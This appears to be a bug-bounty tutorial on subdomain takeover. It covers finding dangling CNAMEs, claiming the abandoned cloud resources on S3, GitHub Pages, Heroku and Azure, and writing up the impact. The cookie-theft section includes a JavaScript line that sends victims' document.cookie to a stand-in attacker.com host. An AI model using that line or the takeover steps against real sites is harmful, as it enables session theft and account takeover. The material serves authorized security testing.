Subdomain Takeover
Subdomain takeover is one of the cleanest bug classes  -  find a dangling CNAME pointing to a cloud service that hasn't been claimed, register it, and you control content on something.target.com. Programs that have mature infra love paying for these because they're easy to verify, clearly in scope, and embarrassing if left open.
The Mechanic
A company sets up blog.target.com pointing to their Heroku app. They shut down the Heroku app but forget to remove the DNS record. The CNAME still resolves to someapp.herokuapp.com  -  which anyone can register. You register it. You now serve content on blog.target.com.

Detection
Automated Scanning
# Enumerate subdomains
subfinder -d target.com -silent | dnsx -silent -cname -o cnames.txt
 
# Feed to nuclei for takeover fingerprinting
nuclei -l subdomains.txt -t nuclei-templates/takeovers/ -o results.txt
 
# Alternatively, can-i-take-over-xyz has a curated fingerprint list
# github.com/EdOverflow/can-i-take-over-xyz
Manual Verification
When automated tools flag a subdomain, verify manually:
# Check the CNAME chain
dig blog.target.com CNAME +short
 
# Check if the final destination resolves and what it serves
curl -ski blog.target.com | head -20
 
# Common vulnerable responses
# - "There is no app deployed at this address" (Heroku)
# - "NoSuchBucket" (S3)
# - "Repository not found" (GitHub Pages)
# - Azure: "404 Web Site not found"
# - Fastly: "Fastly error: unknown domain"
Service-Specific Patterns
Amazon S3
CNAME → somebucket.s3.amazonaws.com
Response when vulnerable: NoSuchBucket. Create a bucket with the exact same name in any region. Upload an index.html. Done.
GitHub Pages
CNAME → someorg.github.io
Response when vulnerable: There isn't a GitHub Pages site here. or 404 from GitHub. Register a GitHub org/user matching the name, create a repo, enable Pages.
Heroku
CNAME → someapp.herokuapp.com
Response: No such app. Create a Heroku app with that name, add the custom domain in Heroku settings.
Azure
CNAME → something.azurewebsites.net
CNAME → something.cloudapp.azure.com
CNAME → something.trafficmanager.net
Azure is harder  -  name registration requires matching the Azure subscription. But the Traffic Manager variant is still common.
Other Services Worth Checking
Fastly, Pantheon, Ghost.io, Tumblr (deprecated but CNAMEs linger), Zendesk, Surge.sh, Readme.io, HubSpot, Shopify custom domains.
The can-i-take-over-xyz repo is the canonical reference  -  check it for current status of each service.
Exploitation: Cookie Theft
The real escalation is when the target scopes cookies to the parent domain:
Set-Cookie: session=abc123; Domain=.target.com; Path=/; Secure
That .target.com means the cookie is sent to every subdomain  -  including your taken-over one. Host a page that reads document.cookie, and any victim who visits your subdomain while logged in leaks their session.
// Hosted on taken-over subdomain
document.location = 'attacker.com/steal#039; + encodeURIComponent(document.cookie);
Check for parent-domain scoped cookies before writing up your impact. If you see Domain=.target.com on an auth cookie, the severity jumps significantly.
Beyond Cookie Theft
Even without parent-domain cookies, a subdomain takeover gives you:

A trusted origin for CORS chains (if the app trusts *.target.com)
A same-site context that bypasses SameSite=Lax for CSRF
A credible phishing domain under the target's brand
A vector for postMessage exploits if the main app trusts messages from subdomains

Reporting
Document:

The exact CNAME chain (dig output)
The vulnerable service fingerprint (curl output showing the error page)
Proof you can register it  -  a screenshot or the actual registration
What cookies are scoped to .target.com
A hosted PoC page demonstrating the impact (phishing page or cookie theft demo)

Don't just report the DNS issue without demonstrating exploitation. "Dangling CNAME" by itself is infrastructure hygiene. Cookie theft via taken-over subdomain is an account takeover finding.
Checklist

 Run subfinder + dnsx to enumerate subdomains with CNAME records
 Run nuclei takeovers template against CNAME results
 Manually verify flagged subdomains with dig and curl
 Check if service name is available for registration
 Inspect target cookies for Domain=.target.com scoped auth cookies
 Check if main app CORS policy trusts *.target.com
 Check SameSite posture  -  does a same-site context help bypass CSRF?
 Claim the service (within program rules), document with timestamps
